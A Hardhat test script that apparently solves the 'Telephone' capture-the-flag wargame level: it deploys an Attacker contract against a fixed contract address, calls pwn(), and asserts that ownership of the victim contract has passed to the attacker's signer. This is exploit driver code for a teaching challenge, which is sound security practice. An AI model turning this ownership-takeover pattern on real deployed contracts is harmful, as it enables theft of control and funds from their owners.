import { TransactionResponse } from "@ethersproject/providers";
import { expect } from "chai";
import { ethers } from "hardhat";

describe("Telephone", function () {
  it("Pwn", async function () {
    const ABI = ["function owner() view returns (address)"];
    const ADDRESS = "0x375892CD4180f016391BD5421059b8452bd21000";
    const victimContract = await ethers.getContractAt(ABI, ADDRESS);
    const [signer] = await ethers.getSigners();
    console.log("Deploying attacker contract...");
    const attackerContract = await ethers.deployContract("contracts/Telephone.sol:Attacker", [ADDRESS]);
    await attackerContract.deployTransaction.wait();

    console.log("Pwning victim contract...");
    const tx: TransactionResponse = await attackerContract.pwn();
    await tx.wait();
    const owner: string = await victimContract.owner();
    console.log(`owner(): ${owner}`);
    expect(owner).to.equal(signer.address);
  });
});
